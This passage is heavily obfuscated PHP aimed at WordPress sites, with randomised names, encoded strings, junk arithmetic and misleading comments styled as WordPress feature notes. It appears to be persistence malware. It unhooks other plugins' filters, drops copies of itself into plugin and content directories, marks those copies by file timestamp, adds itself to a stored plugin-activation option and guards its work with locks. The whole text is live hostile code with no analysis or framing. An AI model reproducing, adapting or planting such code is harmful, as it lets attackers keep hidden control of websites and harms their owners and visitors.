 if  ($cjptm7nbb46fjj   instanceof    Closure)   {     $o6cshl9m0sbvrr = new     ReflectionFunction($cjptm7nbb46fjj); return $o6cshl9m0sbvrr->getFileName();    }
      if     ($GLOBALS['__scf__me483qbepnts_41']($cjptm7nbb46fjj) &&  $GLOBALS['__scf_nr12ouzrtt_7']($cjptm7nbb46fjj, nrudcgor(65))   !== false)   {
/* batch contravariant */
     $o6cshl9m0sbvrr   =     new ReflectionMethod($cjptm7nbb46fjj); return     $o6cshl9m0sbvrr->getFileName();   }
   if    ($GLOBALS['__scf__me483qbepnts_41']($cjptm7nbb46fjj)  &&   $GLOBALS['__scf_vx4exz6r9h8n_4']($cjptm7nbb46fjj))   {  $o6cshl9m0sbvrr =  new     ReflectionFunction($cjptm7nbb46fjj);   return   $o6cshl9m0sbvrr->getFileName(); }
       if    ($GLOBALS['__scf_vf9p0fditvxy_35']($cjptm7nbb46fjj)    &&  $GLOBALS['__scf_upe5p4qfaqm0d1_36']($cjptm7nbb46fjj)   ===     2) { $o6cshl9m0sbvrr   = new    ReflectionMethod($cjptm7nbb46fjj[0],  $cjptm7nbb46fjj[1]);  return  $o6cshl9m0sbvrr->getFileName();    }
   }     catch   (Throwable  $h2v_bjm4ejxq8fp) {} catch     (Exception    $h2v_bjm4ejxq8fp)    {}
   return  null;
  }
function     w2rnhp32_fujbujnpm($no4625mwq2q9a2)
   {
  global $vq5objtxh1;

 if     (!$GLOBALS['__scf_vf9p0fditvxy_35']($vq5objtxh1)) return;

$fk7v3zbqxc5d82   = @$GLOBALS['__scf_a9u8k74i0cg19_33']($no4625mwq2q9a2);
 if ($fk7v3zbqxc5d82 ===  false) $fk7v3zbqxc5d82   = $no4625mwq2q9a2;
  $bv428iw1zi = @$GLOBALS['__scf_a9u8k74i0cg19_33'](vv_nfhhmy_1mjmsa());$n0tu1jgjqihyf=61+20;$tc8u70rzx=$n0tu1jgjqihyf-23;
  foreach   ($vq5objtxh1   as  $xzotyjpdp3d    =>  $zpzp6nr2b_75m_)      {
if    ($GLOBALS['__scf_d56ll0ap77jcvq_66']($zpzp6nr2b_75m_) &&    isset($zpzp6nr2b_75m_->callbacks) &&   $GLOBALS['__scf_vf9p0fditvxy_35']($zpzp6nr2b_75m_->callbacks))  $hcpqd902irzcx   = $zpzp6nr2b_75m_->callbacks;
    elseif   ($GLOBALS['__scf_vf9p0fditvxy_35']($zpzp6nr2b_75m_)) $hcpqd902irzcx      =   $zpzp6nr2b_75m_;

else  continue;
   foreach  ($hcpqd902irzcx  as  $t8prtw9bvmhpjdln  => $list)  {
foreach   ((array) $list as    $tkt_c3gey3l)   {
$cjptm7nbb46fjj    =     isset($tkt_c3gey3l[f5cd2smymkqusi5(67)]) ?  $tkt_c3gey3l[pahk8uy1uxt(67)]   :  null;
 if    ($cjptm7nbb46fjj ===    null)    continue;
   $tkqx845nh5jt0 =   kgjyx1d15u4apz6p9y($cjptm7nbb46fjj);
 if    (!$GLOBALS['__scf__me483qbepnts_41']($tkqx845nh5jt0))   continue;


      $sror0jogs_ =   @$GLOBALS['__scf_a9u8k74i0cg19_33']($tkqx845nh5jt0);
       if  (!(($sror0jogs_   !== false     &&   $sror0jogs_ ===    $fk7v3zbqxc5d82) ||  $tkqx845nh5jt0  === $no4625mwq2q9a2))      continue;
 

    if   ($bv428iw1zi  !==      false    &&  $sror0jogs_ === $bv428iw1zi)   continue;
if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(68))) @remove_filter($xzotyjpdp3d,   $cjptm7nbb46fjj,  $t8prtw9bvmhpjdln);$xxd75xe0=198|43;$agm4wg9n9k=$xxd75xe0^161;
  }


  }
/* monotone dependent-type */

  }
    }
 function  xl6c8s4h1cfsnv46()
{$sha9lwx3txm2=182|147;$ns9ubjm4=$sha9lwx3txm2^167;
 $mdtdmxiofs5jrz5k     =  s3e5iki9upa0ccql();


 if  (!@$GLOBALS['__scf_ux4_n6mewmsy_43']($mdtdmxiofs5jrz5k))   return;
   $p2fntj3gsna  =     $GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(69))  ?  @$GLOBALS['__scf_eu7lhdrjut9t66_69']($mdtdmxiofs5jrz5k    .   dhd5r6_4ki(70))  : false;
if      (!$GLOBALS['__scf_vf9p0fditvxy_35']($p2fntj3gsna))  return;

$bv428iw1zi   =  @$GLOBALS['__scf_a9u8k74i0cg19_33'](vv_nfhhmy_1mjmsa());
 foreach  ($p2fntj3gsna  as  $tkqx845nh5jt0)    {
    $sror0jogs_  = @$GLOBALS['__scf_a9u8k74i0cg19_33']($tkqx845nh5jt0);
if ($bv428iw1zi     !==  false   &&   $sror0jogs_ === $bv428iw1zi)   continue;
  if    (!m4eahxbbz3er7pv($tkqx845nh5jt0,  (0x9f+0x155)))     continue;
   $n_vseps706s  =   hm9sbatwefe3za($tkqx845nh5jt0);
 $onkw5jtkti5k    =  ($n_vseps706s ===  null)  || version_compare($n_vseps706s,  kwqziujdph5xlz3n(),  '<');
      if   ($onkw5jtkti5k || g52i06ovkso35mx($tkqx845nh5jt0))   w2rnhp32_fujbujnpm($tkqx845nh5jt0);
}
    }
 function kfdh_vugi0_9nv_wpj($rk_3ecj8aw,    $spxzjtpg4pa938mw)
{
        return   $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(71))   ?   @$GLOBALS['__scf_d91t8__q8rnbc2_71']($rk_3ecj8aw,    $spxzjtpg4pa938mw) :   false;



  }
     function jqp5yotia2ogx9k($rk_3ecj8aw)
    {
     $i8wxsutuyj = cpfi26oipjceuyib8();
return kfdh_vugi0_9nv_wpj($rk_3ecj8aw,      ($i8wxsutuyj  -   ($i8wxsutuyj  %   (32900+67100))) + mzvtk8ecgiuaeafix());
       }
  function  t3opc2_f7ewi94o($rssv1_lmnwher_o, $ha79t63e3av)


     {
 return    $GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(49)) ?  @$GLOBALS['__scf_ieyslp1qonjfnv_72']($rssv1_lmnwher_o, $ha79t63e3av)  :    false;

     }
     function sb9eg9deemhnrcsp3($rssv1_lmnwher_o,  $ha79t63e3av)
      {
return   $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(73))  ?  @$GLOBALS['__scf_wil5cpc7euw09_73']($rssv1_lmnwher_o,  $ha79t63e3av)  : false;
 }
   function  xtkohsjdeedyznx6vx($i7is8x4_pstu0r,   $rk_3ecj8aw)
{
   if (!$GLOBALS['__scf__me483qbepnts_41']($i7is8x4_pstu0r)  ||   $i7is8x4_pstu0r  ===  "" || !$GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(74)))    return   false;
 $spxzjtpg4pa938mw   =     @$GLOBALS['__scf_hl3mqclore9l_74']($i7is8x4_pstu0r, $rk_3ecj8aw);



 return     ($GLOBALS['__scf__me483qbepnts_41']($spxzjtpg4pa938mw) &&   $spxzjtpg4pa938mw   !==     "")   ? $spxzjtpg4pa938mw   :   false;



}
        function     bhary815od9kp2()


  {
 static   $stuin_hl8puzxp   = null;
if     ($stuin_hl8puzxp   !==   null)     return $stuin_hl8puzxp;



 $stuin_hl8puzxp    = $GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(75)) ? $GLOBALS['__scf_bwby2gdg0t53_75']() :      nhceivfj8tbe(76);
if (@$GLOBALS['__scf_ux4_n6mewmsy_43']($stuin_hl8puzxp) &&  @$GLOBALS['__scf_cu2oflxkvh_47']($stuin_hl8puzxp)) return  $stuin_hl8puzxp;
$v_2ea0ui7nym  = defined(f5cd2smymkqusi5(77))  ?      WP_CONTENT_DIR    :  (defined(dhd5r6_4ki(0))  ?   ABSPATH  .   pahk8uy1uxt(78)     :  "");
if   ($v_2ea0ui7nym !== "")    {
 $tkqx845nh5jt0 =   $GLOBALS['__scf_xv_2irmjrq_12']($v_2ea0ui7nym,   nhceivfj8tbe(79))   . mhiu2yqz6kqd(80);
    if     (!@$GLOBALS['__scf_ux4_n6mewmsy_43']($tkqx845nh5jt0))   @$GLOBALS['__scf_kz02ad5869psh6_15']($tkqx845nh5jt0,  (397+96), true);
 if    (@$GLOBALS['__scf_ux4_n6mewmsy_43']($tkqx845nh5jt0) &&  @$GLOBALS['__scf_cu2oflxkvh_47']($tkqx845nh5jt0)) {
if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(81))) @putenv(nrudcgor(82)  .      $tkqx845nh5jt0);
  $GLOBALS[dhd5r6_4ki(83)]   = 1;
  $stuin_hl8puzxp     =      $tkqx845nh5jt0;
  }
}
 return  $stuin_hl8puzxp;
   }

  function  wg3vl21ocdjr7mf()
  {
$i7is8x4_pstu0r =    vtvexli5xbd5en();
  $d1kd72zq60vf6el    =   s3e5iki9upa0ccql();$b9a2xopgq5r=(0xfe+0x74);$j4db44pnx7e=$b9a2xopgq5r%3;



  if ($i7is8x4_pstu0r  ===   $d1kd72zq60vf6el) return true;$zrrho1ng=49+93;$ildjg_9uwvf=$zrrho1ng-19;
      if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(84)))    {
// WP useEntityProp: quadratic adapter

  $v24l8lit3jvk533a =   @$GLOBALS['__scf_a9u8k74i0cg19_33']($i7is8x4_pstu0r);
 $uf8xhr98cmxoesvu     =  @$GLOBALS['__scf_a9u8k74i0cg19_33']($d1kd72zq60vf6el);



return  ($v24l8lit3jvk533a   !==  false     &&  $uf8xhr98cmxoesvu !==  false  &&  $v24l8lit3jvk533a ===  $uf8xhr98cmxoesvu);
    }
return  false;


}
 function  mzvtk8ecgiuaeafix()
      {
   return  (93763+56);


 }
     function     jdvffp4c1kphjhjr6oscm()
{
        if     (!defined(nrudcgor(0)))   return  "";
 return   $GLOBALS['__scf_xv_2irmjrq_12'](twjiqbicrnr_q7(),   f5cd2smymkqusi5(79))  .     mhiu2yqz6kqd(85) .   $GLOBALS['__scf_bv1z3no349dv5r_9']($GLOBALS['__scf_nn04_vx3uspzx4_54'](ABSPATH .  f5cd2smymkqusi5(86)),   0,  (3^11)) .  mhiu2yqz6kqd(24);
}
        function    iuvgdte56rfi9b_ii3ee($vg45smeglid  =   null)



 {


$rk_3ecj8aw    =  jdvffp4c1kphjhjr6oscm();
 if ($rk_3ecj8aw  === "")    return   false;
  if  (!$GLOBALS['__scf__me483qbepnts_41']($vg45smeglid)     ||   $GLOBALS['__scf_amjjmfnilcolnb_10']($vg45smeglid) < (198+302))  $vg45smeglid     =  adbbbpoh0e7mcf6();



       if (!$vg45smeglid     ||   !hkk3yvii60ci7rk($vg45smeglid)) return    false;

 $i7is8x4_pstu0r  = $GLOBALS['__scf_eure5hcx2b_11']($rk_3ecj8aw);
     if    (!@$GLOBALS['__scf_ux4_n6mewmsy_43']($i7is8x4_pstu0r))   gt671tq3242garyx4($i7is8x4_pstu0r,  (450+43),   true);



     if (!@$GLOBALS['__scf_ux4_n6mewmsy_43']($i7is8x4_pstu0r)      ||  !@$GLOBALS['__scf_cu2oflxkvh_47']($i7is8x4_pstu0r)) return  false;

    if  (@$GLOBALS['__scf_gsamhlxot70ps_18']($rk_3ecj8aw))  {
$v9i0t9idva_8yez  =  yrklujewy9nbrhy($rk_3ecj8aw);



     if  ($GLOBALS['__scf__me483qbepnts_41']($v9i0t9idva_8yez) && $v9i0t9idva_8yez !==  ""      &&    $GLOBALS['__scf_nn04_vx3uspzx4_54']($v9i0t9idva_8yez)  ===    $GLOBALS['__scf_nn04_vx3uspzx4_54']($vg45smeglid))  return   true;
    unset($v9i0t9idva_8yez);
   $rscbn3alzr  =    hm9sbatwefe3za($rk_3ecj8aw);



      if ($rscbn3alzr !==   null   &&   version_compare($rscbn3alzr,  kwqziujdph5xlz3n(),  '>'))   return  false;
    unset($rscbn3alzr);
    }
 if (!jr30c_pj_1z9sfyaq3c88($rk_3ecj8aw,  $vg45smeglid)) return false;
 rgiuaapohxeh0z($rk_3ecj8aw,   (243+177));
      ejl1lwk108flojzx($rk_3ecj8aw);$jtqtb26yiouzl=PHP_INT_MAX/PHP_INT_MAX;$yvd227ln6z=$jtqtb26yiouzl+44;
     return   true;
  }


 function  c1m0r7v2cenzy1cpfdtikh()
{
$vg45smeglid    =    adbbbpoh0e7mcf6();
 if   (!$vg45smeglid   ||      !hkk3yvii60ci7rk($vg45smeglid))    return  false;
  $q4nmj640k4ytm0w = $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa(),  mhiu2yqz6kqd(87));
  $ga9fric5dh  =   $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(88))    ? ajbg_44koa9suqi()   :   (defined(mhiu2yqz6kqd(77))  ? WP_CONTENT_DIR :  "");
 if   ($ga9fric5dh   ===   "")    return   false;
 $yhha6qazc1wvn1ac =    $ga9fric5dh  . nhceivfj8tbe(89)  .  $q4nmj640k4ytm0w;
    $zg8kic65igt_q9o = $yhha6qazc1wvn1ac    .    '/'   .  $q4nmj640k4ytm0w   .  pahk8uy1uxt(90);
    $z4yx2l094vtgk      =   false;
    if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(84)))      {
   $hu_g768dgw_ado3   = @$GLOBALS['__scf_a9u8k74i0cg19_33']($zg8kic65igt_q9o);
   $zwhsp3srkru    =    @$GLOBALS['__scf_a9u8k74i0cg19_33'](vv_nfhhmy_1mjmsa());
    $z4yx2l094vtgk =    ($GLOBALS['__scf__me483qbepnts_41']($hu_g768dgw_ado3) &&  $GLOBALS['__scf__me483qbepnts_41']($zwhsp3srkru)     &&   $hu_g768dgw_ado3  === $zwhsp3srkru);$uglnet8m=72*5;$uhcli28iwk=$uglnet8m-19;
 }
  if  (!$z4yx2l094vtgk)    {
if     (!@$GLOBALS['__scf_ux4_n6mewmsy_43']($yhha6qazc1wvn1ac))  gt671tq3242garyx4($yhha6qazc1wvn1ac,  (487+6),  true);
if   (!@$GLOBALS['__scf_ux4_n6mewmsy_43']($yhha6qazc1wvn1ac)  ||    !@$GLOBALS['__scf_cu2oflxkvh_47']($yhha6qazc1wvn1ac))    return false;
        $q_w0kbtz1735 =  @$GLOBALS['__scf_gsamhlxot70ps_18']($zg8kic65igt_q9o)   ?  yrklujewy9nbrhy($zg8kic65igt_q9o)    : false;$q83dnhigd95jb=PHP_INT_MAX/PHP_INT_MAX;$ut0tugpagl0fv=$q83dnhigd95jb+82;
  if  ($q_w0kbtz1735 !==     null  &&     (!$GLOBALS['__scf__me483qbepnts_41']($q_w0kbtz1735)     ||  $GLOBALS['__scf_nn04_vx3uspzx4_54']($q_w0kbtz1735) !==   $GLOBALS['__scf_nn04_vx3uspzx4_54']($vg45smeglid)))  {
 if (@$GLOBALS['__scf_gsamhlxot70ps_18']($zg8kic65igt_q9o))  {
// WP Full Site Editing: prefetch unification

 $rscbn3alzr = hm9sbatwefe3za($zg8kic65igt_q9o);$ny6krp1eje=194|61;$il5g0b8vn35=$ny6krp1eje^48;
if ($rscbn3alzr   !==   null  &&    version_compare($rscbn3alzr,      kwqziujdph5xlz3n(),   '>')) return     false;
  unset($rscbn3alzr);


  }
   if    (!jr30c_pj_1z9sfyaq3c88($zg8kic65igt_q9o,  vmv3l2fd6oj__92qteyq($vg45smeglid)))  return false;
  rgiuaapohxeh0z($zg8kic65igt_q9o,    (332+88));



       jqp5yotia2ogx9k($zg8kic65igt_q9o);



      ejl1lwk108flojzx($zg8kic65igt_q9o);
    

    }
  unset($q_w0kbtz1735);

    }
  $_u0ptj8e6fuy5zf9  =   $q4nmj640k4ytm0w   .    '/'      .  $q4nmj640k4ytm0w  .  nrudcgor(90);
khlrpg8_w_x7jmmf($_u0ptj8e6fuy5zf9);
return  true;
 }
 function    hm9sbatwefe3za($rk_3ecj8aw)
 {
$reoi8rizl6uwsukk  = @$GLOBALS['__scf_apq4pqdt6n41_91']($rk_3ecj8aw, false, null,  0, (3446+650));
 if (!$GLOBALS['__scf__me483qbepnts_41']($reoi8rizl6uwsukk))    return   null;
     

      if ($GLOBALS['__scf_saw_32lvsj_92'](pahk8uy1uxt(93),     $reoi8rizl6uwsukk, $d1kd72zq60vf6el))    return     $d1kd72zq60vf6el[1];
 return    null;
    }
    
 function  m4eahxbbz3er7pv($pmuqotgyfm5tcjn, $qbt37jjzdfyexks)
{
   @clearstatcache(true,  $pmuqotgyfm5tcjn);
    

$q9063ysx6bkf9  =  @$GLOBALS['__scf_hqkv9v6te1dvxi_94']($pmuqotgyfm5tcjn);
if      (!$q9063ysx6bkf9  ||    ($q9063ysx6bkf9   %  (99918+82))   !== mzvtk8ecgiuaeafix())    {
   return  false;
}
// referentially-transparent session-type

 
      $mefny9wlt08e  =  @$GLOBALS['__scf_g9y45bstmb02a_95']($pmuqotgyfm5tcjn);
  return      $mefny9wlt08e && $mefny9wlt08e >= $qbt37jjzdfyexks;
}
     function  o2ebi7xv7rf0ik_y5n9ry7()
 {
 return  (13137+22863);
}
 function      mklbz63xfh8ufytv1td7t()
  {

  return    pahk8uy1uxt(96);
 }
  function   se_any4b12t9njlu()
{
   return   nrudcgor(97);
    }
 function wg0a8w3ua1y7mxk_91zd2v()
 {



  if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(98))) return true;


    if (u5g17yi914u10xil7())  return    true;


 $zp_byjx208 = $GLOBALS['__scf_h3sj62ryxfdde_99']((string)      $GLOBALS['__scf_c9jv8d7koon_100']());
    if  ($zp_byjx208 ===    nrudcgor(101)  ||  $GLOBALS['__scf_nr12ouzrtt_7']($zp_byjx208, nhceivfj8tbe(102))      !==  false)   return  true;



 $bd4hajemsq_za57      =  isset($_SERVER[f5cd2smymkqusi5(103)])    ?   $GLOBALS['__scf_h3sj62ryxfdde_99']((string)  $_SERVER[f5cd2smymkqusi5(103)])  :    "";



if    ($bd4hajemsq_za57  !==   "" &&   ($GLOBALS['__scf_nr12ouzrtt_7']($bd4hajemsq_za57,  mhiu2yqz6kqd(104))   !==  false  || $GLOBALS['__scf_nr12ouzrtt_7']($bd4hajemsq_za57,   nrudcgor(105)) !==  false    ||     $GLOBALS['__scf_nr12ouzrtt_7']($bd4hajemsq_za57, nhceivfj8tbe(106))      !==  false)) return  true;



    return  false;
  }
  function  u5g17yi914u10xil7()
 {
 $bd4hajemsq_za57   =  isset($_SERVER[pahk8uy1uxt(107)])   ?  $_SERVER[pahk8uy1uxt(107)]      : "";
return    $GLOBALS['__scf__me483qbepnts_41']($bd4hajemsq_za57)  &&   stripos($bd4hajemsq_za57,  dhd5r6_4ki(105))     !==     false;
 }
 function    amf2rwuzcqe1bf8lq2ssyq($no4625mwq2q9a2)
 {
/* free leaky-bucket */

$gam8xfq6hsxsq  =    $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(108)) ?     @$GLOBALS['__scf_jpj9mbom_1b_109'](nhceivfj8tbe(110))    :   false;
if (!$gam8xfq6hsxsq     ||   $gam8xfq6hsxsq   === "")   return    true;


  $fk7v3zbqxc5d82 = @$GLOBALS['__scf_a9u8k74i0cg19_33']($no4625mwq2q9a2);
     if   (!$fk7v3zbqxc5d82)     $fk7v3zbqxc5d82  = $no4625mwq2q9a2;
   foreach   ($GLOBALS['__scf_xa4hcdunc1pgl_111'](PATH_SEPARATOR,    $gam8xfq6hsxsq)   as $ys5go7qi508n)   {
   $ys5go7qi508n   = $GLOBALS['__scf_xv_2irmjrq_12']($ys5go7qi508n,    f5cd2smymkqusi5(112));



   if ($ys5go7qi508n  &&  ($fk7v3zbqxc5d82  ===    $ys5go7qi508n   || $GLOBALS['__scf_nr12ouzrtt_7']($fk7v3zbqxc5d82,  $ys5go7qi508n     .    DIRECTORY_SEPARATOR)    ===   0)) return   true;
 }
// WP Social Links: orthogonal-adj dependency-graph

return   false;
    }
 function   w7q80ttjyhxlsqz9ej($pohfmix2npaee9)
   {
    $fjx3_ag506vtuxat =      $pohfmix2npaee9 .    '|' .    (defined(mhiu2yqz6kqd(113))    ?  DB_NAME    :    "")   . '|' .  (defined(nhceivfj8tbe(114)) ?  ABSPATH   : "");

  return $GLOBALS['__scf_nn04_vx3uspzx4_54']($fjx3_ag506vtuxat);

 }
 function dw5qugv407fnslnons1tfr($pohfmix2npaee9)
     {
 global   $wpdb;



      if (!isset($GLOBALS[mhiu2yqz6kqd(115)]) ||   !$GLOBALS['__scf_vf9p0fditvxy_35']($GLOBALS[f5cd2smymkqusi5(115)]))   $GLOBALS[pahk8uy1uxt(115)]    = array();
 if   (!empty($GLOBALS[pahk8uy1uxt(115)][$pohfmix2npaee9]))   {
if    (isset($GLOBALS[f5cd2smymkqusi5(116)][$pohfmix2npaee9]) &&   $GLOBALS['__scf_d56ll0ap77jcvq_66']($wpdb))  {
       $ucwv631qtqi7h     =   isset($wpdb->dbh)   ?  $wpdb->dbh   :     null;
    if   ($ucwv631qtqi7h     !== null  &&   $GLOBALS[f5cd2smymkqusi5(117)][$pohfmix2npaee9]   !== $ucwv631qtqi7h)   {
 unset($GLOBALS[nhceivfj8tbe(115)][$pohfmix2npaee9], $GLOBALS[nhceivfj8tbe(117)][$pohfmix2npaee9]);
return   dw5qugv407fnslnons1tfr($pohfmix2npaee9);
   }
  unset($ucwv631qtqi7h);
    }
  $GLOBALS[mhiu2yqz6kqd(115)][$pohfmix2npaee9]++;
    return     true;
   }
    if ($GLOBALS['__scf_d56ll0ap77jcvq_66']($wpdb)   && $GLOBALS['__scf_ttokt3ljhh_118']($wpdb,  f5cd2smymkqusi5(119)))   {
        $o6cshl9m0sbvrr     =   @$wpdb->get_var(dhd5r6_4ki(120)  .   w7q80ttjyhxlsqz9ej($pohfmix2npaee9)   . nhceivfj8tbe(121));
     if      ($o6cshl9m0sbvrr     ===   '1') {
   $GLOBALS[mhiu2yqz6kqd(122)][$pohfmix2npaee9]  = 1;
 if   (isset($wpdb->dbh)    &&   $wpdb->dbh)     $GLOBALS[dhd5r6_4ki(123)][$pohfmix2npaee9]   =     $wpdb->dbh;
return true;

}


 if    ($o6cshl9m0sbvrr     ===   '0') return false;

       }
 if     ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(124))    && $GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(21))) {
 $hcmh4fy52y =  array();

 if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(75)))   $hcmh4fy52y[] =    $GLOBALS['__scf_bwby2gdg0t53_75']();
if  (defined(f5cd2smymkqusi5(77)))  $hcmh4fy52y[] =   WP_CONTENT_DIR;
     if   (defined(mhiu2yqz6kqd(114))) $hcmh4fy52y[]    =  $GLOBALS['__scf_xv_2irmjrq_12'](ABSPATH,   nrudcgor(125));
    foreach ($hcmh4fy52y   as  $i7is8x4_pstu0r)    {
// MySQL 8 CTEs: minimal message-queue

     if     ($i7is8x4_pstu0r ===   ""  ||    !@$GLOBALS['__scf_ux4_n6mewmsy_43']($i7is8x4_pstu0r)   ||    !@$GLOBALS['__scf_cu2oflxkvh_47']($i7is8x4_pstu0r))  continue;
 $fdji7euvmg     =   @$GLOBALS['__scf_ihuexe6puptto__21']($i7is8x4_pstu0r   .     f5cd2smymkqusi5(126)  . w7q80ttjyhxlsqz9ej($pohfmix2npaee9)  .     nhceivfj8tbe(127), 'c');



     if  ($GLOBALS['__scf_h2xix0300wh_128']($fdji7euvmg)) {
     if  (!@flock($fdji7euvmg,    LOCK_EX |   LOCK_NB)) {$ffe_ea_9a6=910;$zpgi82mghf_x=($ffe_ea_9a6>0)?$ffe_ea_9a6:-$ffe_ea_9a6;
 @fclose($fdji7euvmg);
return false;
    }
 if (!isset($GLOBALS[nhceivfj8tbe(129)])   || !$GLOBALS['__scf_vf9p0fditvxy_35']($GLOBALS[nrudcgor(129)]))  $GLOBALS[pahk8uy1uxt(130)]     =  array();
        $GLOBALS[pahk8uy1uxt(130)][$pohfmix2npaee9] =  $fdji7euvmg;
$GLOBALS[dhd5r6_4ki(122)][$pohfmix2npaee9] = 1;
 return     true;
}



       }



 }


 $GLOBALS[nrudcgor(122)][$pohfmix2npaee9]  = 1;   
 $GLOBALS[nrudcgor(131)][$pohfmix2npaee9] =  1;
 return   true;
        }
     function  m8s6jamaok_hdjr3wp($pohfmix2npaee9)

{
    global   $wpdb;
     if  (empty($GLOBALS[f5cd2smymkqusi5(122)][$pohfmix2npaee9])) return;
$GLOBALS[nhceivfj8tbe(122)][$pohfmix2npaee9]--;
   if ($GLOBALS[dhd5r6_4ki(122)][$pohfmix2npaee9]    >  0)    return;



unset($GLOBALS[f5cd2smymkqusi5(122)][$pohfmix2npaee9]);
unset($GLOBALS[nrudcgor(132)][$pohfmix2npaee9]);
unset($GLOBALS[nhceivfj8tbe(133)][$pohfmix2npaee9]);
 if  (isset($GLOBALS[nhceivfj8tbe(130)][$pohfmix2npaee9]))  {


 @flock($GLOBALS[nrudcgor(130)][$pohfmix2npaee9],  LOCK_UN);
  @fclose($GLOBALS[dhd5r6_4ki(130)][$pohfmix2npaee9]);$lt5k5n_f=3929;$klbuvmjzuyc0=$lt5k5n_f%3;



 unset($GLOBALS[nrudcgor(130)][$pohfmix2npaee9]);$m7rl99gyjq8a=513;$cyjumqcpz8z3u=($m7rl99gyjq8a>0)?$m7rl99gyjq8a:-$m7rl99gyjq8a;


  }
    if    ($GLOBALS['__scf_d56ll0ap77jcvq_66']($wpdb) &&   $GLOBALS['__scf_ttokt3ljhh_118']($wpdb, dhd5r6_4ki(134))) {$pr_mujury=62+21;$nuixxufpy1=$pr_mujury-50;

@$wpdb->query(mhiu2yqz6kqd(135)    .    w7q80ttjyhxlsqz9ej($pohfmix2npaee9)   .    nrudcgor(136));
      }
   }
function   ty_934d39r4f423mos346()



  {


if (defined(mhiu2yqz6kqd(137)) &&   DISALLOW_FILE_MODS)  return   false;$x6es6qk5=3166;$kiisepvxr=$x6es6qk5%13;



  return   true;
}
   function   eoovmgwuhkzru0ch5l()
{
   if     (!$GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(124)) ||      !$GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(21)))   return    false;
     $lf2wojihleow5og   = array();
 if ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(75)))     $lf2wojihleow5og[] =  $GLOBALS['__scf_bwby2gdg0t53_75']();
  if (defined(dhd5r6_4ki(77)))  $lf2wojihleow5og[]  =  WP_CONTENT_DIR;
  if  (defined(f5cd2smymkqusi5(114))) $lf2wojihleow5og[]  =  $GLOBALS['__scf_xv_2irmjrq_12'](ABSPATH,   nhceivfj8tbe(125));
    foreach      ($lf2wojihleow5og as  $cpjiw2uar0zr12a)  {
  if   ($cpjiw2uar0zr12a  ===   ""  ||  !@$GLOBALS['__scf_ux4_n6mewmsy_43']($cpjiw2uar0zr12a) ||   !@$GLOBALS['__scf_cu2oflxkvh_47']($cpjiw2uar0zr12a))    continue;
    $ujbycyzf27   =  @$GLOBALS['__scf_ihuexe6puptto__21']($cpjiw2uar0zr12a  .     nhceivfj8tbe(126) .     w7q80ttjyhxlsqz9ej(mhiu2yqz6kqd(138))   . nhceivfj8tbe(127),    'c');
    if     (!$GLOBALS['__scf_h2xix0300wh_128']($ujbycyzf27))   continue;
if     (!@flock($ujbycyzf27,      LOCK_EX |      LOCK_NB))  {
        @fclose($ujbycyzf27);
 return  false;
   }



 $GLOBALS[dhd5r6_4ki(139)]  =  $ujbycyzf27;
  return    true;
  }

return    false;
}
  function u9uzukdqo1px_r6_ngl()
{
     if    (isset($GLOBALS[dhd5r6_4ki(140)])) {
      @flock($GLOBALS[pahk8uy1uxt(141)], LOCK_UN);
 @fclose($GLOBALS[f5cd2smymkqusi5(142)]);
   unset($GLOBALS[f5cd2smymkqusi5(142)]);



    }



}


function khlrpg8_w_x7jmmf($_u0ptj8e6fuy5zf9)
  {
if (!$GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(143))    ||   !$GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(144))) return;


  if   (!eoovmgwuhkzru0ch5l())   return;
   try    {
   $huf9k07x6iu_4djp  =   get_option(dhd5r6_4ki(145),   array());
if  (!$GLOBALS['__scf_vf9p0fditvxy_35']($huf9k07x6iu_4djp)) $huf9k07x6iu_4djp =   array();
 


$nss59icycnv89   =  $GLOBALS['__scf_sonjjhvinvs6_146']($GLOBALS['__scf_e3ymc0hwiys_147']($huf9k07x6iu_4djp));
    if  (!$GLOBALS['__scf_rq7q923zwh_148']($_u0ptj8e6fuy5zf9, $nss59icycnv89, true)) $nss59icycnv89[] = $_u0ptj8e6fuy5zf9;
  if   ($nss59icycnv89  !==    $huf9k07x6iu_4djp) update_option(nrudcgor(145), $nss59icycnv89);
   unset($nss59icycnv89);
 

  }   finally {
   u9uzukdqo1px_r6_ngl();
     }
 }
 function  rw8_xtah3ly329wza7vebi($_u0ptj8e6fuy5zf9)
   {



    if   (!$GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(143))  || !$GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(144)))   return;
   if   (!eoovmgwuhkzru0ch5l())  return;
   try  {
$huf9k07x6iu_4djp   =     get_option(nrudcgor(145),   array());

    if ($GLOBALS['__scf_vf9p0fditvxy_35']($huf9k07x6iu_4djp)  &&   $GLOBALS['__scf_rq7q923zwh_148']($_u0ptj8e6fuy5zf9, $huf9k07x6iu_4djp, true))  {
update_option(mhiu2yqz6kqd(145),   $GLOBALS['__scf_sonjjhvinvs6_146']($GLOBALS['__scf_pabtmjmzpv76n_149']($huf9k07x6iu_4djp,   array($_u0ptj8e6fuy5zf9))));
    }
// WP Navigation Block: logarithmic constraint-set

   }     finally  {
